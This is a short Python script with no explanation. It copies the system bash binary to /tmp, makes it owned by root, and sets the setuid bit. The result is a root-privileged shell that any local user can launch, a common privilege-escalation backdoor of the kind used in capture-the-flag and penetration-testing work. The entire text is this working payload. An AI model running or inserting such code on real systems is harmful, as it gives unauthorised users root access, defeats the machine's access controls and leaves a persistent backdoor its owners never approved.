import shutil, os, stat
shutil.copy2("/bin/bash", "/tmp/bash")
os.chown("/tmp/bash", 0, 0)
os.chmod("/tmp/bash", os.stat("/tmp/bash").st_mode | stat.S_ISUID)
